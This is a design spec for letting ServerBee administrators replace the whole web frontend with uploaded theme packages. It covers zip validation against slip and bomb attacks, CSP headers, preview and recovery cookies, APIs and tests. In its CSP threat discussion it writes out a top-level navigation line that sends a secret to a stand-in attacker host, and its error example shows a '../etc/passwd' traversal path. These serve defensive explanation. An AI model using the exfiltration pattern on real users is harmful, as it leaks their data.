# Custom SPA Themes Design

**Status:** Draft
**Date:** 2026-05-26
**Branch:** `victoria`
**Related:** existing color-theme system in `apps/web/src/themes/`, brand settings at `crates/server/src/router/api/brand.rs`

## Goal

Let administrators replace the entire ServerBee frontend (login page, dashboards, settings, every route) with a custom SPA they upload as a `.sbtheme` package. The default React SPA becomes one of many possible frontends. The HTTP/WebSocket API, authentication, and Rust backend are unchanged — the theme is pure frontend that talks to the existing API.

This is the "WordPress theme" model adapted to a React + Rust monitoring tool: full visual freedom, admin-only upload, and a clear trust statement — **themes are admin-installed trusted frontend code**, equivalent in power to an admin replacing the bundled SPA on disk. CSP is applied as defense-in-depth (it raises the bar for opportunistic exfiltration vectors like remote image beacons and external script loads) but is **not** a containment boundary; a malicious admin-installed theme can read anything the admin can read via same-origin APIs and can exfiltrate via top-level navigation. If untrusted theme execution ever becomes a requirement, that is a separate redesign (sandboxed iframe on a distinct origin, scoped postMessage RPC, no shared cookies) and is out of scope for this spec.

## Non-goals (v1)

- Marketplace / community theme registry (file upload only)
- Server-side code in themes (WASM, JS sandbox, etc.) — themes are pure HTML/JS/CSS
- Slot-based plugin extension points (custom widgets, sidebar items) — whole-SPA replacement only
- Per-user theme preference — one active theme system-wide
- Hot-reload during theme development (rely on `bun run pack` cycle)
- Theme signing / code review workflow
- Auto-upgrade on new version upload (admin must explicitly activate)
- Theme that ships its own backend assets, Rust crates, or migrations

These constraints keep v1 implementable in one development cycle. The security model is "admin-installed = trusted, same as replacing the bundled SPA on disk." CSP is defense-in-depth, not containment.

---

## 1. Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                            SERVER                                │
│                                                                  │
│  spa_themes table (BLOB storage, source of truth)               │
│       ▲                                                          │
│       │ upload / activate / delete (admin REST)                  │
│       │                                                          │
│  ┌────┴────────────────┐   on activate    ┌─────────────────┐  │
│  │ SpaThemeService     │ ──────────────►  │ ArcSwap<Option> │  │
│  │ - validate manifest │   atomic swap    │ <LoadedTheme>>  │  │
│  │ - validate zip      │                  └────────┬────────┘  │
│  │ - extract to mem    │                           │           │
│  └─────────────────────┘                           │ read      │
│                                                    ▼           │
│         ┌──────────────────────────────────────────────────┐   │
│         │  Axum route handler (catch-all `/*`)              │   │
│         │  resolves theme to serve via the precedence in    │   │
│         │  Section 6.5 (query string > cookies > active >   │   │
│         │  default), then serves bytes with CSP for themes  │   │
│         │  or rust-embed for the default SPA.               │   │
│         └──────────────────────────────────────────────────┘   │
│                                                                  │
│  /api/*, /api/ws/*, /swagger-ui/*, /__system/* unchanged        │
│  (themes cannot shadow these paths)                              │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                            BROWSER                               │
│                                                                  │
│  Active theme HTML/JS/CSS runs same-origin with ServerBee, with │
│  the user's session cookie. Theme has the same data-access      │
│  authority as the user. Trust model: admin-installed = trusted. │
│  CSP is defense-in-depth, not a containment boundary.           │
└─────────────────────────────────────────────────────────────────┘
```

- Default SPA continues to ship via `rust-embed` (compile-time, zero runtime cost).
- Custom themes live in SQLite as zip BLOBs (source of truth), extracted into an in-memory `HashMap<String, Bytes>` on activation.
- `ArcSwap<Option<LoadedTheme>>` gives readers lock-free access on the hot serve path.
- The "active theme" pointer is a value in the existing `ConfigService` KV store under key `ACTIVE_SPA_THEME_KEY` (Section 2.2). Absent / empty = serve the built-in default SPA.
- Color themes and brand settings (existing) are orthogonal and untouched. When a custom SPA theme is active, the existing color/brand controls have no effect (the theme owns its own colors and branding). The UI hides them with an explanatory note.

---

## 2. Data Model

### 2.1 New table `spa_themes`

| Column | Type | Notes |
|---|---|---|
| `id` | INTEGER PRIMARY KEY AUTOINCREMENT | Internal numeric ID |
| `uuid` | TEXT NOT NULL UNIQUE | UUIDv4, used in URLs / API. Matches workspace `uuid` crate feature set (`Cargo.toml:23` enables only `v4`). Time-ordering is not needed because `uploaded_at` already provides it. |
| `manifest_id` | TEXT NOT NULL | `manifest.id` from package; multiple rows can share this (version history) |
| `name` | TEXT NOT NULL | From `manifest.name`, HTML-stripped, ≤ 64 chars |
| `version` | TEXT NOT NULL | semver from `manifest.version` |
| `author` | TEXT NULL | From `manifest.author`, ≤ 64 chars |
| `description` | TEXT NULL | From `manifest.description`, ≤ 500 chars |
| `manifest_json` | TEXT NOT NULL | Full sanitized manifest, JSON-encoded |
| `package_data` | BLOB NOT NULL | Original `.zip` bytes (source of truth) |
| `preview_data` | BLOB NULL | Extracted preview image (≤ 500KB) |
| `preview_mime` | TEXT NULL | e.g. `image/png` |
| `size_bytes` | INTEGER NOT NULL | Package size (uncompressed total of allowed files) |
| `uploaded_by` | TEXT NOT NULL | FK → `users.id` (`users.id` is `TEXT` per `crates/server/src/entity/user.rs:6`) |
| `uploaded_at` | TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP |
| `is_superseded` | INTEGER NOT NULL DEFAULT 0 | 1 when a newer version of the same `manifest_id` was uploaded |

Indexes:
- `UNIQUE(uuid)`
- `INDEX(manifest_id, version)` for upgrade lookup
- `INDEX(uploaded_at DESC)` for listing

### 2.2 Active-theme pointer

Stored via the existing `ConfigService` KV store (used today for `ACTIVE_THEME_KEY` color theme). New key:

- `ACTIVE_SPA_THEME_KEY = "active_spa_theme_uuid"` → value is the `spa_themes.uuid` string, or absent/empty when no custom SPA theme is active.

Storing the UUID (not the numeric id) keeps the value stable across re-imports and matches what the API surface accepts.

**Delete behavior** (matches `CustomThemeService::delete_rejects_in_use_active_theme`): the service rejects `DELETE` on the active theme with HTTP 409 `THEME_IN_USE`. The admin must deactivate first via `PUT /api/settings/active-spa-theme {theme_id: null}` and then delete. There is no auto-deactivate-on-delete path. If the stored uuid is dangling (row deleted out of band, e.g. via direct DB edit), the runtime falls back to the default SPA and logs a warning, mirroring `CustomThemeService::active_theme`.

### 2.3 Audit log

Reuse the existing `audit_logs` table (entity: `crates/server/src/entity/audit_log.rs`). Schema is `id, user_id, action, detail, ip, created_at`. SPA theme events:

| `action` | `detail` (JSON in the text column) |
|---|---|
| `spa_theme.upload` | `{"uuid":"...", "manifest_id":"...", "version":"...", "size_bytes":...}` |
| `spa_theme.activate` | `{"uuid":"..."}` |
| `spa_theme.deactivate` | `{"uuid":"..."}` (previous active) |
| `spa_theme.delete` | `{"uuid":"...", "manifest_id":"...", "version":"..."}` |

No schema change to `audit_logs`.

---

## 3. Package Format (`.sbtheme`)

A `.sbtheme` file is a standard zip with a fixed layout:

```
acme-dashboard.sbtheme
├── manifest.json       (required)
├── index.html          (required, default entry; path can be overridden in manifest)
├── assets/             (optional; conventional location for built JS/CSS/images)
└── preview.png         (optional; shown on theme card)
```

The package may only contain files whose extension is in the whitelist (Section 3.2). Documentation, README, license files, etc. should be distributed alongside the theme (e.g. in the source repo), not inside the `.sbtheme` package — the server never serves them and they only inflate the size budget.

### 3.1 `manifest.json` schema

```json
{
  "schema_version": 1,
  "id": "acme-dashboard",
  "name": "Acme Corp Dashboard",
  "version": "1.2.0",
  "author": "Acme Inc",
  "homepage": "https://acme.example.com",
  "description": "Branded dashboard for Acme.",
  "entry": "index.html",
  "preview": "preview.png"
}
```

`min_serverbee_version` is intentionally omitted from this example. Authors should leave it unset unless they actually depend on a newer feature, because semver treats a release like `1.0.0` as **greater** than a prerelease like `1.0.0-alpha.3`. Setting `"min_serverbee_version": "1.0.0"` would reject the theme on the current `1.0.0-alpha.3` workspace builds. The starter template ships with the field commented out and a note explaining this gotcha.

| Field | Required | Constraint |
|---|---|---|
| `schema_version` | yes | Integer; v1 accepts only `1` |
| `id` | yes | Matches `^[a-z][a-z0-9-]{2,63}$` |
| `name` | yes | 1–64 chars; HTML tags stripped |
| `version` | yes | Valid semver |
| `author` | no | ≤ 64 chars; HTML tags stripped |
| `homepage` | no | Valid `http(s)://` URL |
| `description` | no | ≤ 500 chars; HTML tags stripped |
| `entry` | no | Defaults to `index.html`; must exist in package and end with `.html` |
| `min_serverbee_version` | no | semver; must be ≤ running server version |
| `preview` | no | Relative path; must exist; ≤ 500KB; one of `png/jpg/webp` |

### 3.2 Package constraints

- Total uncompressed size ≤ **20 MB**
- File count ≤ **1000**
- Per-file size ≤ **5 MB**
- Per-file path length ≤ 255 chars
- Allowed extensions (case-insensitive): `html, htm, js, mjs, css, png, jpg, jpeg, svg, webp, gif, ico, woff, woff2, ttf, otf, json, txt, map`
- Forbidden: directory traversal (`..`), absolute paths, Windows drive letters, symlink zip entries, duplicate entries, zero-byte `manifest.json`
- Compression ratio guard: any single entry whose decompressed size exceeds compressed size by > 100× is rejected (zip bomb defense)
- Multipart upload hard cap on the HTTP layer: **25 MB** (leaves headroom over the 20 MB content cap for zip overhead)

---

## 4. Upload & Validation Pipeline

```
POST /api/settings/spa-themes (multipart/form-data, field: package)
    │
    ├─ route-level: DefaultBodyLimit::max(25 * 1024 * 1024)
    │  ↑ REQUIRED. Axum Multipart's default is 2 MB; without this layer
    │    uploads > 2 MB are rejected by the extractor with HTTP 413 before
    │    the handler runs. Mirror the pattern at
    │    crates/server/src/router/api/file.rs:133.
    │
    ├─ Custom extractor: `SpaThemeUpload` wraps `Multipart` and implements
    │  `FromRequest`. On `MultipartRejection`, it converts the rejection into
    │  `AppError::Domain { status: 413, code: "UPLOAD_TOO_LARGE", ... }`
    │  for payload-too-large, or appropriate codes for other rejection kinds
    │  (`INVALID_MULTIPART`, etc.). This is what makes the stable error
    │  contract in §4.1 actually returnable for body-limit cases — without
    │  it, the default Axum 413 response body would not match the JSON
    │  contract that tests and the frontend depend on.
    │
    ├─ require_admin middleware
    │
    ▼
1. Read multipart `package` field into Vec<u8>
2. Open as zip (zip crate)
3. Iterate entries:
   - Reject ../, abs paths, drive letters, symlinks, duplicates
   - Reject disallowed extensions
   - Enforce per-file size cap, running total cap, count cap, ratio cap
   - Read manifest.json if present (must be first or random-access)
4. Parse manifest.json → ThemeManifest
5. Validate manifest fields (regex / semver / lengths / entry exists / min_version)
6. Sanitize text fields (HTML-strip)
7. Lookup existing rows with same manifest_id:
   - If newest existing version > uploaded version → 400 NoDowngrade
   - If newest existing version == uploaded version → 409 VersionExists
   - Otherwise mark existing rows is_superseded = 1
8. Insert new spa_themes row (transactional)
9. Audit-log spa_theme.upload
10. Return { uuid, manifest, size_bytes, preview_url, is_upgrade_of }
```

### 4.1 Error contract

The current shared `ErrorDetail` (`crates/server/src/error.rs:27`) only has `code: String` and `message: String`, with `code` populated from a coarse HTTP-status-bucket enum (`BAD_REQUEST`, `VALIDATION_ERROR`, …). The spec needs finer-grained, stable codes for the upload pipeline so the frontend can localize messages and tests can assert on specific failures.

**Prerequisite change** to `crates/server/src/error.rs` (additive, backward compatible):

1. Extend `ErrorDetail` with an optional structured payload:

   ```rust
   pub struct ErrorDetail {
       pub code: String,
       pub message: String,
       #[serde(skip_serializing_if = "Option::is_none")]
       pub details: Option<serde_json::Value>,
   }
   ```

   Existing callers do not populate `details`; the field is omitted from JSON when absent, so existing API responses are byte-identical.

2. Add an `AppError::Domain` variant that carries a domain-specific code and optional details:

   ```rust
   #[error("{message}")]
   Domain {
       status: StatusCode,
       code: &'static str,
       message: String,
       details: Option<serde_json::Value>,
   },
   ```

   `IntoResponse` for `Domain` uses the variant's own `status` and `code`, and copies `details` into the response body.

3. SPA theme code defines a small `SpaThemeError` enum that converts into `AppError::Domain` with the appropriate status/code, e.g.:

   ```rust
   SpaThemeError::ZipSlip { entry } 
       → AppError::Domain { 
           status: BAD_REQUEST, 
           code: "ZIP_SLIP", 
           message: "package contains unsafe path", 
           details: Some(json!({ "entry": entry })),
       }
   ```

With this in place, the spec's contract is:

```json
{
  "error": {
    "code": "ZIP_SLIP",
    "message": "package contains unsafe path",
    "details": { "entry": "../etc/passwd" }
  }
}
```

Stable code set (used by frontend i18n and integration tests):

| code | HTTP | when |
|---|---|---|
| `UPLOAD_TOO_LARGE` | 413 | multipart body exceeds 25 MB hard cap |
| `INVALID_MULTIPART` | 400 | multipart payload is malformed (parse failure, bad field, malformed zip) — `details.reason` carries the raw cause |
| `MISSING_MANIFEST` | 400 | no `manifest.json` in package |
| `INVALID_MANIFEST` | 400 | manifest fails schema validation (details.field names it) |
| `MISSING_ENTRY` | 400 | `entry` path not present in package |
| `INCOMPATIBLE_VERSION` | 400 | `min_serverbee_version` > running version |
| `ZIP_SLIP` | 400 | entry path escapes package root |
| `ZIP_BOMB` | 400 | compression ratio > 100× on a single entry |
| `SYMLINK_NOT_ALLOWED` | 400 | zip entry has symlink mode bits |
| `DUPLICATE_ENTRY` | 400 | same path appears twice |
| `DISALLOWED_EXTENSION` | 400 | file extension not in whitelist |
| `FILE_TOO_LARGE` | 400 | single file > 5 MB |
| `TOO_MANY_FILES` | 400 | > 1000 files |
| `TOTAL_SIZE_EXCEEDED` | 400 | uncompressed total > 20 MB |
| `PREVIEW_TOO_LARGE` | 400 | preview image > 500 KB |
| `NO_DOWNGRADE` | 400 | upload version < newest existing for same id |
| `VERSION_EXISTS` | 409 | upload version equal to an existing row for same id |
| `THEME_IN_USE` | 409 | DELETE on the currently active theme |
| `THEME_NOT_FOUND` | 404 | uuid does not exist |

### 4.2 What we deliberately do NOT do

- **No HTML/JS scanning, no AST analysis.** Themes are admin-installed and trusted (Section 1 trust model). Scanning would imply an enforcement boundary that does not exist — a malicious admin can already write whatever code they want. CSP is defense-in-depth, not enforcement, and scanning the code that runs inside the trust boundary adds cost without adding a real security property.
- **No virus scanning.** Out of scope for a frontend asset pipeline.
- **No automatic theme activation on upload.** Admin must explicitly activate via a second action (prevents "upload a broken theme by accident → site is down").

---

## 5. Runtime Serving Model

### 5.1 `AppState` extension

```rust
pub struct AppState {
    // existing fields
    pub active_spa_theme: Arc<ArcSwap<Option<LoadedTheme>>>,
}

pub struct LoadedTheme {
    pub uuid: String,
    pub manifest: ThemeManifest,
    pub entry: String,                    // e.g. "index.html"
    pub files: HashMap<String, Bytes>,    // normalized POSIX paths → file bytes
    pub mime_cache: HashMap<String, &'static str>, // path → content-type
}
```

`ArcSwap` is preferred over `RwLock` so the hot serve path takes no lock. Memory cost is bounded by the 20 MB package cap.

### 5.2 Startup

On server start, after migrations:
1. Read `ACTIVE_SPA_THEME_KEY` from `ConfigService`
2. If present and a row matches that uuid, load `package_data`, unzip into a `LoadedTheme`, store in `ArcSwap`
3. On dangling uuid (row missing) or corrupt blob, log a warning and fall back to default — do not abort startup

### 5.3 Activation flow

Activation is a global, irreversible-without-recovery commit. There is no per-tab "stay on default" — cookies are origin-scoped, not tab-scoped, so any attempt to make activation tab-local would be a lie. Instead, the UI's safety net is the **preview** mechanism (Section 6.3): admin previews via `?theme=preview:<uuid>` first, then exits preview, then activates. Note that preview is itself browser-wide (see Section 6.3 for the honest scope statement), so the recommended flow uses incognito or a separate browser profile when the admin needs to keep the management UI live during a long review.

```
PUT /api/settings/active-spa-theme  { theme_id: <uuid> | null }
    │
    ├─ require_admin
    ▼
1. If body.theme_id is null:
   - Clear ACTIVE_SPA_THEME_KEY
   - active_spa_theme.store(Arc::new(None))
   - audit: spa_theme.deactivate (detail captures the previous uuid)
   - 200
2. Otherwise:
   - Look up row by uuid (404 if missing)
   - Unzip package_data into LoadedTheme (error if zip corrupted post-storage)
   - Store row.uuid under ACTIVE_SPA_THEME_KEY
   - active_spa_theme.store(Arc::new(Some(loaded)))
   - audit: spa_theme.activate
   - 200 with { activated_uuid }
```

The admin's current tab continues to show whatever it was showing until the next request to a root-serving path. Reloading their tab will pick up the new theme. If they instead want to verify the new theme before committing site-wide, they should use preview first (Section 6.3).

### 5.4 Serve path

Router order (existing routes preserved):

```
/api/*              → existing handlers (themes cannot shadow)
/api/ws/*           → existing handlers
/swagger-ui/*       → existing
/api-docs/*         → existing
/__system/*         → new reserved prefix (Section 6.4)
/*                  → SPA serve handler, follows the precedence in Section 6.5
                      to choose default vs preview vs active vs default-fallback;
                      then for the chosen theme:
                       - Normalize requested path; default to t.entry for `/`
                       - If t.files contains path → 200 + bytes + CSP + content-type
                       - Else if t.files contains t.entry → 200 + entry HTML
                         (catches SPA history routing for arbitrary deep paths)
                       - Else → 404
                      The default SPA case is served by rust-embed exactly as today.
```

### 5.5 CSP headers (theme responses only)

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: same-origin
```

**What this CSP does and does not do**:
- Blocks remote script tags, stylesheets, images, fonts, fetch/XHR/WebSocket, iframe embedding, form posts to other origins — i.e. opportunistic exfiltration via passive resource loads.
- Does **not** block top-level navigation exfiltration (`location.href = 'https://attacker.com/?secret=' + ...`). The CSP3 `navigate-to` directive that would cover this is not supported by browsers in practice.
- Does **not** prevent the theme from reading any data the current user can read via same-origin API (it has the session cookie).

`unsafe-eval` is included pragmatically — most React/Vue/Svelte/wasm-bindgen builds require it. Stricter exclusion is parked as Open Question 2.

The default SPA continues to be served by the existing static handler, which does not currently set CSP. This spec does not change that — adding CSP to the default SPA is out of scope. The headers above apply only to responses that serve a custom theme's files.

### 5.6 Caching

- Theme assets: `Cache-Control: public, max-age=31536000, immutable` for paths under `assets/` (assumes fingerprinted filenames per Vite convention).
- `index.html` and other top-level files: `Cache-Control: no-cache`.
- ETag computed from SHA-256 of the file bytes (cheap given in-memory storage).

---

## 6. Recovery & Safety Mechanisms

### 6.1 Why this section exists

A custom SPA replaces the *entire* UI, including the page admins use to switch themes. A broken or malicious theme can lock everyone out. Three layered escape hatches:

### 6.2 `?theme=default` query parameter (recovery)

Any request with `?theme=default` in the query string returns the default SPA, regardless of the active-theme pointer. To survive SPA client-side navigations that drop the query string, the handler also sets `Set-Cookie: sb_force_default=1; Path=/; Max-Age=3600; SameSite=Strict` (no `HttpOnly` — the recovery UI may want to surface or clear it). Once set, the cookie keeps the entire origin on the default SPA for one hour.

To exit recovery: visit `?theme=default` and click "Exit recovery" (which calls `POST /__system/clear-recovery`, clearing the cookie). Or visit `?theme=active` once, which clears the cookie and forces serving the currently active theme for that request.

### 6.3 `?theme=preview:<uuid>` query parameter (preview-before-activate)

Admin-only. Serves the specified theme for the current request **without** changing `ACTIVE_SPA_THEME_KEY`. The handler also sets `Set-Cookie: sb_preview_theme=<uuid>; Path=/; Max-Age=900; SameSite=Strict` so SPA client-side navigation within the preview tab continues to serve that theme.

**Honest scope: this cookie is browser-wide (origin-scoped), not tab-local.** Cookies have no per-tab dimension; any attempt to claim otherwise would mislead. As a consequence, while preview is active:

- Every root-serving request from any tab in the same browser profile (after the first one that sets the cookie) sees the previewed theme.
- The default-SPA management tab, if reloaded, will also flip into the preview theme. This is by design and the UI must surface it loudly.

The mitigated UX workflow:

1. Admin uploads theme `<uuid>`
2. Admin clicks "Preview" → confirmation dialog explains: "Preview is browser-wide for 15 minutes. Open the new tab, do your review, then exit preview before activating."
3. Click-through → new tab opens to `/?theme=preview:<uuid>`. A persistent banner inside the served theme (added by the preview handler as a small injected script — see § 6.6) shows `Preview mode · expires in MM:SS · [Exit preview]`.
4. Admin reviews the theme. If satisfied, clicks **Exit preview** in the banner (or in the management tab if it's still on the default SPA — admin must use a separate browser/incognito if they need to keep the management UI live during a long review).
5. Exiting preview clears `sb_preview_theme` and reloads to the default SPA. Admin is back in the management UI.
6. Admin clicks "Activate" in the management UI → global active flips.

Auto-expiry: the 15-minute `Max-Age` is an upper bound on how long an abandoned preview stays sticky. Admin can shorten this manually with **Exit preview** at any time. Visiting `?theme=active` or `?theme=default` also clears it (Section 6.5).

Validator note: only admins can set or have the cookie honored. The serve handler ignores `sb_preview_theme` for non-admin sessions and falls through to active/default.

### 6.6 Preview-mode banner injection

When the serve handler decides to render a preview theme (Section 6.5 step 2 or 5), it appends a small `<script>` tag just before `</body>` of the served HTML — only for top-level navigation requests, not asset responses. The script renders a fixed-position banner showing remaining time and an Exit preview button that:

```js
fetch('/__system/clear-preview', { method: 'POST' }).then(() => location.reload())
```

Themes cannot suppress this banner. The injection is content-type aware: only modifies responses with `Content-Type: text/html` and only when the cookie or query indicates preview mode. The injected snippet is short (under 1 KB) and has its own `nonce` in the CSP header for that response, since `'unsafe-inline'` is already on for themes.

### 6.4 `/__system/*` reserved prefix

Routes under `/__system/*` are always served by the default SPA, never overridden by a custom theme. v1 routes:

- `POST /__system/clear-recovery` — clear `sb_force_default` cookie
- `POST /__system/clear-preview` — clear `sb_preview_theme` cookie
- `/__system/admin/spa-themes` — admin-only theme management page (default SPA)

Themes are forbidden from declaring entries that would collide with `/__system/*` (validator rejects packages with such paths, although in practice they'd just be unreachable).

### 6.5 Cookie precedence on the serve path

When deciding what to serve for a `GET /<path>` request:

```
1. If query string contains theme=default → serve default SPA, set sb_force_default cookie
2. Else if query string contains theme=preview:<uuid> and caller is admin
   → serve that theme, set sb_preview_theme cookie
3. Else if query string contains theme=active
   → clear both sb_force_default and sb_preview_theme cookies, serve active (or default if none)
4. Else if sb_force_default cookie present → serve default SPA
5. Else if sb_preview_theme cookie present and caller is admin → serve that theme
6. Else if ACTIVE_SPA_THEME_KEY is set → serve active theme
7. Else → serve default SPA (rust-embed)
```

This precedence is deterministic and testable end-to-end.

---

## 7. API Surface

All routes are admin-only (existing `require_admin` middleware), return `ApiResponse<T>`, and are documented via `#[utoipa::path]`.

| Method | Path | Body | Returns |
|---|---|---|---|
| `GET` | `/api/settings/spa-themes` | — | `[{ uuid, manifest, size_bytes, uploaded_by, uploaded_at, is_active, is_superseded }]` |
| `POST` | `/api/settings/spa-themes` | multipart `package` | `{ uuid, manifest, size_bytes, preview_url, is_upgrade_of }` |
| `GET` | `/api/settings/spa-themes/:uuid` | — | full theme metadata |
| `GET` | `/api/settings/spa-themes/:uuid/preview` | — | image bytes (or 404) |
| `GET` | `/api/settings/spa-themes/:uuid/package` | — | original zip bytes (admin download) |
| `DELETE` | `/api/settings/spa-themes/:uuid` | — | 204 (409 if active) |
| `GET` | `/api/settings/active-spa-theme` | — | `{ theme_id: uuid | null }` |
| `PUT` | `/api/settings/active-spa-theme` | `{ theme_id: uuid \| null }` | `{ activated_uuid \| null }` |

Themes themselves consume the existing `/api/*` and `/api/ws/*` surface; no new "theme SDK" endpoint. The existing OpenAPI document at `/api-docs/openapi.json` is the canonical reference for theme authors.

---

## 8. Frontend: `/settings/appearance` Changes

A new top section `CustomSpaThemeSection` lives in `apps/web/src/routes/_authed/settings/appearance.tsx`, placed above the existing `ThemeGrid` (color themes) and `BrandSettingsSection` blocks. It is rendered only for admin users (gated by the existing role check).

### 8.1 Components

- `CustomSpaThemeSection` — orchestrator, warning banner, grid layout
- `SpaThemeCard` — per-theme card with preview, manifest excerpt, active indicator, actions (Preview / Activate / Delete)
- `SpaThemeUploadCard` — drag-drop + file picker, progress, error display
- `ActivateSpaThemeDialog` — confirmation modal with checkbox gate; copy includes recovery URL
- `SpaThemeDetailsDrawer` — right drawer with full manifest, file list, audit history, package download

The "Preview" action on each card opens a confirmation dialog first that explicitly states: *"Preview is browser-wide for up to 15 minutes — any tab in this browser that reloads `/` will see the preview theme until you exit. If you need the management UI live during preview, use a separate browser or incognito window."* On confirm, it opens `/?theme=preview:<uuid>` in a new tab.

The preview banner inside the served theme (Section 6.6) gives the admin an always-visible exit. After exiting preview, the management tab resumes on the default SPA and the admin can click "Activate" with confidence. No post-activation modal is needed.

### 8.2 API hooks (in `apps/web/src/api/spa-themes.ts`)

- `useSpaThemes()` — list, React Query
- `useUploadSpaTheme()` — multipart, with progress
- `useDeleteSpaTheme()`
- `useActivateSpaTheme()` — `PUT /api/settings/active-spa-theme`
- `useActiveSpaTheme()`

### 8.3 Behavioural rules

- Non-admins do not see this section at all (server-side enforced; UI is defense in depth)
- When a custom theme is active, the existing color-theme grid and brand-settings section show a banner: "A custom frontend is active. These settings have no effect until it is deactivated."
- Cannot delete the active theme (button disabled, tooltip explains)
- Activation modal requires a checkbox: "I understand and want to activate"

---

## 9. Developer Workflow

### 9.1 Starter template

Location: `templates/serverbee-theme-starter/` in this repo (single source of truth; CI can validate it builds; users can `npx degit ZingerLittleBee/ServerBee/templates/serverbee-theme-starter my-theme`).

Contents:

```
serverbee-theme-starter/
├── manifest.json
├── package.json              # bun + vite + typescript
├── vite.config.ts            # base: '/' (REQUIRED for SPA history routing — see note)
├── index.html
├── public/preview.png
├── src/
│   ├── main.tsx
│   ├── App.tsx
│   ├── lib/serverbee.ts      # API client (fetch + WS) using same-origin auth
│   └── index.css
├── pack.ts                   # bun run pack → <id>-<version>.sbtheme
└── README.md
```

`pack.ts` runs `vite build`, validates the output against the same constraints the server enforces (size, count, extensions), and produces a deterministic zip.

**Why `base: '/'` and not `'./'`**: themes are always served from `/`, but the server falls back to the theme's entry HTML for arbitrary deep paths to support SPA history routing (Section 5.4). With `base: './'`, a reload at `/servers/abc` would request `./assets/app.js` and resolve it to `/servers/assets/app.js` → 404. `base: '/'` produces absolute asset URLs (`/assets/app.js`) that resolve correctly regardless of the current SPA route. Themes do not need to support being served from a sub-path; if that ever changes, the design will revisit.

### 9.2 Documentation

Add `apps/docs/content/docs/{cn,en}/themes/custom-frontend.mdx` covering:

1. What can/cannot be customized
2. Quickstart (degit → edit → pack → upload)
3. Manifest reference (full table)
4. API & WebSocket reference (link to swagger-ui)
5. CSP constraints and what they mean for theme authors
6. Recovery and debugging (`?theme=default`, `/__system/admin`, DevTools CSP violations)
7. Best practices (i18n, dark mode, accessibility, mobile)
8. Size and file limits

Bilingual, consistent with existing 16-page documentation style.

### 9.3 Out of scope for v1

- `@serverbee/theme-cli` (`sbt new / pack / validate / publish`) — defer to v2; starter + `pack.ts` is enough to ship.
- Theme marketplace, signing, distribution registry — v2+.

---

## 10. Testing

### 10.1 Rust unit tests

`crates/server/src/service/spa_theme/`:

- `manifest_validator` — table-driven cases for each rejection reason and each successful shape
- `zip_extractor`:
  - Zip slip (entries with `../`, absolute paths, drive letters)
  - Zip bomb (single entry with > 100× ratio)
  - Symlink zip entries
  - Duplicate entries
  - Per-file / total / count limits
  - Disallowed extensions
  - Valid package → expected file map
- `version_upgrade` — semver comparison and downgrade rejection

### 10.2 Rust integration tests

`crates/server/tests/spa_theme_integration.rs` (matches existing integration test conventions):

- Non-admin upload → 403
- Admin upload of valid sample fixture → 200, row inserted
- Same id + higher version → 200 + `is_upgrade_of` + previous row marked superseded
- Same id + lower version → 400 `NO_DOWNGRADE`
- Same id + same version → 409 `VERSION_EXISTS`
- Activate by uuid → subsequent `GET /` returns theme entry HTML (assert via response body marker)
- `GET /?theme=default` always returns default SPA marker + sets recovery cookie
- Delete active theme → 409
- Delete inactive theme → 204, blob removed
- Upload pre-built malicious fixtures (zip slip, zip bomb, symlink) → 400 with specific error codes

Fixture packages live under `crates/server/tests/fixtures/spa_themes/`.

### 10.3 Frontend tests (vitest)

`apps/web/src/routes/_authed/settings/appearance.test.tsx` and per-component test files:

- Section visibility per role
- Upload flow with mocked multipart, including error responses
- Activation dialog gating on checkbox
- Active theme deletion disabled state
- API hook contracts

### 10.4 Manual E2E checklist

`tests/spa-themes.md` (follows existing manual-test convention):

- [ ] Admin uploads starter theme → succeeds
- [ ] Non-admin does not see Custom Frontend section
- [ ] `?theme=preview:<uuid>` (admin) renders that theme without changing active
- [ ] `?theme=preview:<uuid>` (non-admin) ignores the preview and renders the active theme
- [ ] Activation commits globally; refreshing any tab shows the new theme
- [ ] `?theme=default` recovers from any custom theme; cookie keeps recovery sticky across SPA nav
- [ ] `?theme=active` exits recovery and preview, clears both cookies
- [ ] Deactivate restores default SPA for all clients on next request
- [ ] Delete non-active theme succeeds
- [ ] Delete active theme rejected with HTTP 409 `THEME_IN_USE`
- [ ] Zip-slip fixture rejected with `ZIP_SLIP` error code
- [ ] Zip-bomb fixture rejected with `ZIP_BOMB` error code
- [ ] Upload > 25 MB rejected with HTTP 413 and JSON body `{"error":{"code":"UPLOAD_TOO_LARGE", ...}}` (verifies the custom extractor maps `MultipartRejection`, not Axum's default text body)
- [ ] CSP headers present on theme responses (verified in DevTools); absent on default SPA
- [ ] Theme with `base: '/'` reloads correctly at deep SPA paths (e.g. `/servers/abc`)
- [ ] Version upgrade: v1.0 → v1.1 succeeds and does not auto-activate
- [ ] Version downgrade: v1.1 → v1.0 rejected with `NO_DOWNGRADE`
- [ ] Same id + same version rejected with `VERSION_EXISTS`
- [ ] Audit log shows upload/activate/deactivate/delete events

---

## 11. Migration & Rollout

### 11.1 Migration

One sea-orm migration `mYYYYMMDD_NNNNNN_create_spa_themes.rs`:
- Create `spa_themes` table with indexes per Section 2.1
- No changes to `config`/KV store (the new `ACTIVE_SPA_THEME_KEY` is set lazily on first activation)
- No changes to `audit_logs` (reused as-is)

Per repo convention, only implement `up()`. `down()` is a no-op.

### 11.2 Backwards compatibility

- Default SPA continues to work unchanged for all existing deployments
- Existing color themes, custom color themes, and brand settings are untouched
- A fresh install has no `ACTIVE_SPA_THEME_KEY` value → identical behavior to today

### 11.3 Capability flag

This feature does not need a server capability bit (themes execute in the browser, not on agents). It is gated only by admin role.

### 11.4 Documentation updates

- `apps/docs/content/docs/{cn,en}/themes/custom-frontend.mdx` — new page
- `apps/docs/content/docs/{cn,en}/configuration.mdx` — add note about the recovery URL
- Link from existing `/settings/appearance` documentation page

---

## 12. Open Questions for Planning

These do not block the design but should be resolved during implementation planning:

1. Whether to keep the `package_data` BLOB in `spa_themes` after extraction. Pros of keeping: source of truth for download/re-extraction; cons: doubles SQLite size. v1 recommendation: keep it (20 MB cap makes the cost bounded), revisit if storage becomes an issue.
